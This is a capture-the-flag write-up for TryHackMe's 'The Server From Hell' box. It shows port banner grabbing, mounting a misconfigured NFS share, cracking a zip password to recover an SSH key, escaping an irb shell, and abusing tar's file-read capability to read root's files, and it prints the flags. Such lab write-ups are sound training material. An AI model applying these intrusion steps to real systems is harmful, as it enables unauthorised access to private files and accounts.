---
title: TryHackMe - The Server From Hell
description: My writeup on The Server From Hell box.
categories:
 - tryhackme
tags: tryhackme nc banner bash nfs ssh nmap nse fcrackzip ruby tar capabilities
---

![](https://i.imgur.com/vpvPeOz.png)

## Box Stats

| Box Info      | Details       |
| ------------- |:-------------:|
| Box Name :    | **The Server From Hell**  |
| Difficulty :  | **Medium**             |
| Play :    | [The Server From Hell](https://tryhackme.com/room/theserverfromhell){:target="_blank"}      |
| Recommended : | Yes :heavy_check_mark:      |

## Summary

Hello, this box is a bit trolling & if you don't know basic coding you will waste lot of time. Let's start!

## Enumeration/Reconnaissance

The challenge says to start at port 1337.

```
Start at port 1337 and enumerate your way.
Good luck.
```

So let's do banner grabbing on port 1337. Banner grabbing is to take information about a network service, it’s software name and version etc.

```
$ nc -v $ip 1337
10.10.142.93 [10.10.142.93] 1337 (?) open
Welcome traveller, to the beginning of your journey
To begin, find the trollface
Legend says he's hiding in the first 100 ports
Try printing the banners from the ports
```

To find the trollface, we will use bash script magic.

```bash
for ports in {1..100}; do nc $ip $ports; echo; done
```

![](https://i.imgur.com/ENEzrml.png)

Let's check port `12345`.

```
$ nc -v $ip 12345
10.10.142.93 [10.10.142.93] 12345 (?) open
NFS shares are cool, especially when they are misconfigured
It's on the standard port, no need for another scan
```

## Shell as hades

Let's enumerate NFS, let's identify the shared directory first.

```
$ showmount -e $ip
Export list for 10.10.142.93:
/home/nfs *
```

Let's mount now & see what the directory contains.

```
$ mount -t nfs $ip:/home/nfs exp
$ cd exp
$ ls -la
total 16
drwxr-xr-x 2 nobody nogroup 4096 Sep 16 01:11 .
drwxr-xr-x 6 root   root    4096 Jan 22 22:20 ..
-rw-r--r-- 1 root   root    4534 Sep 16 01:11 backup.zip
```

Let's copy it to our directory. When we try to open it asks for a password:

```
$ cp backup.zip ..
$ cd ..
$ unzip backup.zip
Archive:  backup.zip
  creating: home/hades/.ssh/
[backup.zip] home/hades/.ssh/id_rsa password:
```

Let's crack it using `fcrackzip`.

```
$ fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt backup.zip

PASSWORD FOUND!!!!: pw == zxcvbnm
$ unzip -q -P zxcvbnm backup.zip
```

We've a username now `hades` & a SSH private key. But on port 22 isnt running SSH:

```
$ nc -v $ip 22
10.10.142.93 [10.10.142.93] 22 (ssh) open
550 12345 0f8008c008fff8000000000000780000007f800087708000800ff00
```

`hint.txt` tells us that SSH port is between `2500-4500`, let's fire up a nmap scan with banner NSE script.

```
$ nmap --script banner -p2500-4500 $ip

...data...

3333/tcp open  dec-notes                                                                
|_banner: SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3
```

Let's login now.

```
$ ssh -i id_rsa hades@$ip -p 3333
irb(main):001:0>
```

We're into `irb` (Interactive Ruby Shell), we can use `system` function to execute bash.

```
irb(main):001:0> system "bash"
hades@hell:~$ whoami;id
hades
uid=1002(hades) gid=1002(hades) groups=1002(hades)
```

## Reading root flag

While enumerating, i noticed tar has the `cap_dac_read_search` capability. We can bypass file read permission and read whatever file we want.

```
hades@hell:~$ getcap -r / 2>/dev/null
/usr/bin/mtr-packet = cap_net_raw+ep
/bin/tar = cap_dac_read_search+ep
```

Let's read `root.txt`

```
hades@hell:/tmp$ tar -cvf root.tar /root/root.txt
tar: Removing leading `/' from member names
/root/root.txt
hades@hell:/tmp$ tar -xf root.tar
hades@hell:/tmp$ cat root/root.txt
thm{w0w_n1c3_3sc4l4t10n}
```

The rest of the flags:

```
hades@hell:/tmp$ cat /home/hades/user.txt ; cat /home/hades/.ssh/flag.txt
thm{sh3ll_3c4p3_15_v3ry_1337}
thm{h0p3_y0u_l1k3d_th3_f1r3w4ll}
```

You can even get a root shell, try it yourself ;)

## Thank You

Thank you for taking the time to read my writeup. If you don't understand something from the writeup or want to ask me something feel free to contact me through discord(0xatom#8707) or send me a message through twitter [0xatom](https://twitter.com/0xatom){:target="_blank"}

Until next time keep pwning hard! :fire:
